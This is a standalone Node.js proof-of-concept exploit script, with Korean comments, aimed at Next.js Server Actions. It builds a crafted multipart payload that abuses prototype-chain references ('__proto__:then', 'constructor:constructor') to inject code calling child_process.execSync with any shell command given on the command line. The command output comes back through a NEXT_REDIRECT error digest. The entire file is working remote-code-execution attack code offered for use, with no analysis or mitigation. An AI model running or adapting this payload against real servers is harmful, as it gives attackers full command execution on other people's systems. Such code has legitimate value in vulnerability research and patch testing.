#!/usr/bin/env node

import FormData from 'form-data';
import fetch from 'node-fetch';

let BASE_URL = 'http://localhost:3000/asdf';
let EXECUTABLE = "echo 'poc' > /tmp/test.txt";

// 스크립트 뒤에 문자열 있으면 해당 문자열을 shell 명령으로 실행
if (process.argv.length === 3) {
  EXECUTABLE = process.argv[2];
} else if (process.argv.length >= 4) {
  BASE_URL = process.argv[2];
  EXECUTABLE = process.argv[3];
}

const craftedChunk = {
  then: "$1:__proto__:then",
  status: "resolved_model",
  reason: -1,
  value: '{"then": "$B0"}',
  _response: {
    _prefix: `var res = process.mainModule.require('child_process').execSync('${EXECUTABLE}',{'timeout':5000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`$\${res}\`});`,
    // If you don't need the command output, you can use this line instead:
    // _prefix: `process.mainModule.require('child_process').execSync('${EXECUTABLE}');`,
    _formData: {
      get: "$1:constructor:constructor",
    },
  },
};

const formData = new FormData();
formData.append('0', JSON.stringify(craftedChunk));
formData.append('1', '"$@0"');

const headers = {
  'Next-Action': 'x', // 이 헤더가 있으면 next.js는 Server Action 요청으로 인식하여 서버에서 실행함
  ...formData.getHeaders(), //getHeader가 자동으로 Content-Type을 담는다.
};

fetch(BASE_URL, {
  method: 'POST',
  headers: headers,
  body: formData,
  timeout: 10000,
})
  .then(async (res) => {
    console.log(res.status);
    const text = await res.text();
    console.log(text);
  })
  .catch((err) => {
    console.error('Error:', err.message);
    process.exit(1);
  });

